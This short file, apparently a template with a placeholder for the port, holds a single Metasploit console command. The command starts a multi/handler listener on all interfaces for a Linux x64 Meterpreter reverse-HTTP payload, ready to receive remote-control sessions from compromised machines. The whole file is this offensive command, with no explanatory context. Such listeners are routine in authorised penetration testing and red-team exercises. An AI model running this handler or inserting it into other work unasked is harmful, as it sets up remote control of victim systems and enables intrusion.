msfconsole -q -x 'use exploit/multi/handler;
set LHOST 0.0.0.0;
set LPORT {{ LPORT }};
set PAYLOAD linux/x64/meterpreter_reverse_http;
run'
